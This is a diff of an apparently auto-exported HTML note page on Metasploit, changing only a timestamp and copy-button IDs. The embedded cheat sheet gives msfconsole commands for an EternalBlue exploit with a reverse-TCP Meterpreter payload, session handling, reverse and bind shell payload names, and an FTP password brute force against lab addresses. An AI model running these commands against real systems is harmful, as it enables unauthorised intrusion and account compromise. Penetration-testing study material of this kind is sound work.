@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:14 -->
+<!-- 2026-07-30 Thu 22:24 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Metasploit</title>
@@ -978,11 +978,11 @@ Related: <a href="20260314T005736--msfvenom__cybersecurity_tool.html">Msfvenom</
 <h2 id="orgb1a0997">Core msfconsole Commands</h2>
 <div class="outline-text-2" id="text-orgb1a0997">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_c87bee08bd3842f0bfd1e6eacd5a855d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_d5227c348ae941d38723a9928ca11707>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c87bee08bd3842f0bfd1e6eacd5a855d=document.querySelector('button[name=btn_c87bee08bd3842f0bfd1e6eacd5a855d]');
-copyBtnbtn_c87bee08bd3842f0bfd1e6eacd5a855d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Start\nmsfconsole\n\n# Search for a module\nsearch type:exploit name:eternalblue\nsearch cve:2021-44228\nsearch platform:windows type:exploit smb\n\n# Use a module\nuse exploit/windows/smb/ms17_010_eternalblue\nuse 0   # use by search result number\n\n# Show options\nshow options\nshow payloads     # compatible payloads for this exploit\nshow targets      # available targets\n\n# Set options\nset RHOSTS 10.10.10.10\nset LHOST 10.10.14.5\nset LPORT 4444\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Global options (persist across module changes)\nsetg LHOST 10.10.14.5\nsetg RHOSTS 10.10.10.10\n\n# Unset\nunset RHOSTS\nunsetg LHOST\n\n# Run\nrun\nexploit\nexploit -j    # run as background job\n\n# Check if target is vulnerable without exploiting\ncheck\n`);copyBtnbtn_c87bee08bd3842f0bfd1e6eacd5a855d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c87bee08bd3842f0bfd1e6eacd5a855d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d5227c348ae941d38723a9928ca11707=document.querySelector('button[name=btn_d5227c348ae941d38723a9928ca11707]');
+copyBtnbtn_d5227c348ae941d38723a9928ca11707.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Start\nmsfconsole\n\n# Search for a module\nsearch type:exploit name:eternalblue\nsearch cve:2021-44228\nsearch platform:windows type:exploit smb\n\n# Use a module\nuse exploit/windows/smb/ms17_010_eternalblue\nuse 0   # use by search result number\n\n# Show options\nshow options\nshow payloads     # compatible payloads for this exploit\nshow targets      # available targets\n\n# Set options\nset RHOSTS 10.10.10.10\nset LHOST 10.10.14.5\nset LPORT 4444\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Global options (persist across module changes)\nsetg LHOST 10.10.14.5\nsetg RHOSTS 10.10.10.10\n\n# Unset\nunset RHOSTS\nunsetg LHOST\n\n# Run\nrun\nexploit\nexploit -j    # run as background job\n\n# Check if target is vulnerable without exploiting\ncheck\n`);copyBtnbtn_d5227c348ae941d38723a9928ca11707.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d5227c348ae941d38723a9928ca11707.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1032,11 +1032,11 @@ check
 <h2 id="org0a2ba57">Typical Exploitation Workflow</h2>
 <div class="outline-text-2" id="text-org0a2ba57">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_0881e2fd77f54461a90dce4a8ae27683>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_ec5ce46cf99448379feb6df60065e4b7>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0881e2fd77f54461a90dce4a8ae27683=document.querySelector('button[name=btn_0881e2fd77f54461a90dce4a8ae27683]');
-copyBtnbtn_0881e2fd77f54461a90dce4a8ae27683.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Identify a vulnerability (Nmap, Searchsploit, manual enumeration)\n2. msfconsole → search for relevant module\n3. use <module>\n4. show options — identify required settings\n5. set RHOSTS, LHOST, LPORT, PAYLOAD\n6. run / exploit\n7. If successful — session opens\n8. sessions -l      # list sessions\n9. sessions -i 1    # interact with session 1\n`);copyBtnbtn_0881e2fd77f54461a90dce4a8ae27683.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0881e2fd77f54461a90dce4a8ae27683.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ec5ce46cf99448379feb6df60065e4b7=document.querySelector('button[name=btn_ec5ce46cf99448379feb6df60065e4b7]');
+copyBtnbtn_ec5ce46cf99448379feb6df60065e4b7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Identify a vulnerability (Nmap, Searchsploit, manual enumeration)\n2. msfconsole → search for relevant module\n3. use <module>\n4. show options — identify required settings\n5. set RHOSTS, LHOST, LPORT, PAYLOAD\n6. run / exploit\n7. If successful — session opens\n8. sessions -l      # list sessions\n9. sessions -i 1    # interact with session 1\n`);copyBtnbtn_ec5ce46cf99448379feb6df60065e4b7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ec5ce46cf99448379feb6df60065e4b7.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1057,11 +1057,11 @@ let res = copyTextToClipboard(`1. Identify a vulnerability (Nmap, Searchsploit, 
 <h2 id="org9050bab">Sessions</h2>
 <div class="outline-text-2" id="text-org9050bab">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_47179798614d4f7392102573093c772e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_319f414fc5cd482e864253e91646e5c1>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_47179798614d4f7392102573093c772e=document.querySelector('button[name=btn_47179798614d4f7392102573093c772e]');
-copyBtnbtn_47179798614d4f7392102573093c772e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# List all open sessions\nsessions -l\nsessions\n\n# Interact with a session\nsessions -i 1\n\n# Background current session (from Meterpreter)\nbackground\nCtrl+Z\n\n# Kill a session\nsessions -k 1\nsessions -K    # kill all\n`);copyBtnbtn_47179798614d4f7392102573093c772e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_47179798614d4f7392102573093c772e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_319f414fc5cd482e864253e91646e5c1=document.querySelector('button[name=btn_319f414fc5cd482e864253e91646e5c1]');
+copyBtnbtn_319f414fc5cd482e864253e91646e5c1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# List all open sessions\nsessions -l\nsessions\n\n# Interact with a session\nsessions -i 1\n\n# Background current session (from Meterpreter)\nbackground\nCtrl+Z\n\n# Kill a session\nsessions -k 1\nsessions -K    # kill all\n`);copyBtnbtn_319f414fc5cd482e864253e91646e5c1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_319f414fc5cd482e864253e91646e5c1.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1091,11 +1091,11 @@ sessions -K    # kill all
 <h3 id="org5c00426">Singles vs Staged</h3>
 <div class="outline-text-3" id="text-org5c00426">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_4e820b16a2604721b9681a407822ba1d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_3af46ec9155b40e584989c71f4941a6c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4e820b16a2604721b9681a407822ba1d=document.querySelector('button[name=btn_4e820b16a2604721b9681a407822ba1d]');
-copyBtnbtn_4e820b16a2604721b9681a407822ba1d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`windows/shell_reverse_tcp      ← single (self-contained, larger)\nwindows/shell/reverse_tcp      ← staged (small stager, fetches main payload)\n\nSingle  — entire payload in one; more reliable on unstable connections\nStaged  — smaller initial payload; requires listener to serve stage\n`);copyBtnbtn_4e820b16a2604721b9681a407822ba1d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4e820b16a2604721b9681a407822ba1d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3af46ec9155b40e584989c71f4941a6c=document.querySelector('button[name=btn_3af46ec9155b40e584989c71f4941a6c]');
+copyBtnbtn_3af46ec9155b40e584989c71f4941a6c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`windows/shell_reverse_tcp      ← single (self-contained, larger)\nwindows/shell/reverse_tcp      ← staged (small stager, fetches main payload)\n\nSingle  — entire payload in one; more reliable on unstable connections\nStaged  — smaller initial payload; requires listener to serve stage\n`);copyBtnbtn_3af46ec9155b40e584989c71f4941a6c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3af46ec9155b40e584989c71f4941a6c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1112,11 +1112,11 @@ Staged  &#8212; smaller initial payload; requires listener to serve stage
 <h3 id="org273df58">Common payloads</h3>
 <div class="outline-text-3" id="text-org273df58">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_f8a3d650853a483c878b3ca259bcdcb0>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_6feb64e49a4c40e392e4406480c70f8e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f8a3d650853a483c878b3ca259bcdcb0=document.querySelector('button[name=btn_f8a3d650853a483c878b3ca259bcdcb0]');
-copyBtnbtn_f8a3d650853a483c878b3ca259bcdcb0.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Windows\nwindows/x64/meterpreter/reverse_tcp\nwindows/x64/shell_reverse_tcp\nwindows/x64/meterpreter/bind_tcp\n\n# Linux\nlinux/x64/meterpreter/reverse_tcp\nlinux/x64/shell_reverse_tcp\n\n# Web\nphp/meterpreter_reverse_tcp\njava/meterpreter/reverse_tcp\n`);copyBtnbtn_f8a3d650853a483c878b3ca259bcdcb0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f8a3d650853a483c878b3ca259bcdcb0.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6feb64e49a4c40e392e4406480c70f8e=document.querySelector('button[name=btn_6feb64e49a4c40e392e4406480c70f8e]');
+copyBtnbtn_6feb64e49a4c40e392e4406480c70f8e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Windows\nwindows/x64/meterpreter/reverse_tcp\nwindows/x64/shell_reverse_tcp\nwindows/x64/meterpreter/bind_tcp\n\n# Linux\nlinux/x64/meterpreter/reverse_tcp\nlinux/x64/shell_reverse_tcp\n\n# Web\nphp/meterpreter_reverse_tcp\njava/meterpreter/reverse_tcp\n`);copyBtnbtn_6feb64e49a4c40e392e4406480c70f8e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6feb64e49a4c40e392e4406480c70f8e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1141,11 +1141,11 @@ java/meterpreter/reverse_tcp
 <h2 id="orge86de0c">Auxiliary Modules</h2>
 <div class="outline-text-2" id="text-orge86de0c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e595b1d8fad3475582a9d014993431e3>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_af23fb0b2ff5416ea24a04c311129734>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e595b1d8fad3475582a9d014993431e3=document.querySelector('button[name=btn_e595b1d8fad3475582a9d014993431e3]');
-copyBtnbtn_e595b1d8fad3475582a9d014993431e3.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Port scan\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24\nset PORTS 22,80,443,445\nrun\n\n# SMB version detection\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS 10.10.10.10\nrun\n\n# FTP brute force\nuse auxiliary/scanner/ftp/ftp_login\nset RHOSTS 10.10.10.10\nset USER_FILE users.txt\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n`);copyBtnbtn_e595b1d8fad3475582a9d014993431e3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e595b1d8fad3475582a9d014993431e3.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_af23fb0b2ff5416ea24a04c311129734=document.querySelector('button[name=btn_af23fb0b2ff5416ea24a04c311129734]');
+copyBtnbtn_af23fb0b2ff5416ea24a04c311129734.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Port scan\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24\nset PORTS 22,80,443,445\nrun\n\n# SMB version detection\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS 10.10.10.10\nrun\n\n# FTP brute force\nuse auxiliary/scanner/ftp/ftp_login\nset RHOSTS 10.10.10.10\nset USER_FILE users.txt\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n`);copyBtnbtn_af23fb0b2ff5416ea24a04c311129734.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_af23fb0b2ff5416ea24a04c311129734.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1174,11 +1174,11 @@ run
 <h2 id="orgb35d0a3">Database Integration</h2>
 <div class="outline-text-2" id="text-orgb35d0a3">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_7296a4c387034fb9bb262583ca5a411d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_0b27d06f12344d37bd2232d3be151579>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7296a4c387034fb9bb262583ca5a411d=document.querySelector('button[name=btn_7296a4c387034fb9bb262583ca5a411d]');
-copyBtnbtn_7296a4c387034fb9bb262583ca5a411d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Start PostgreSQL and Metasploit database\nmsfdb init\nmsfdb start\n\n# In msfconsole\ndb_status               # confirm connection\nworkspace               # list workspaces\nworkspace -a mylab      # create and switch workspace\ndb_nmap -sV 10.10.10.10 # run Nmap and store results\nhosts                   # view discovered hosts\nservices                # view discovered services\nvulns                   # view confirmed vulnerabilities\n`);copyBtnbtn_7296a4c387034fb9bb262583ca5a411d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7296a4c387034fb9bb262583ca5a411d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0b27d06f12344d37bd2232d3be151579=document.querySelector('button[name=btn_0b27d06f12344d37bd2232d3be151579]');
+copyBtnbtn_0b27d06f12344d37bd2232d3be151579.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Start PostgreSQL and Metasploit database\nmsfdb init\nmsfdb start\n\n# In msfconsole\ndb_status               # confirm connection\nworkspace               # list workspaces\nworkspace -a mylab      # create and switch workspace\ndb_nmap -sV 10.10.10.10 # run Nmap and store results\nhosts                   # view discovered hosts\nservices                # view discovered services\nvulns                   # view confirmed vulnerabilities\n`);copyBtnbtn_0b27d06f12344d37bd2232d3be151579.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0b27d06f12344d37bd2232d3be151579.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
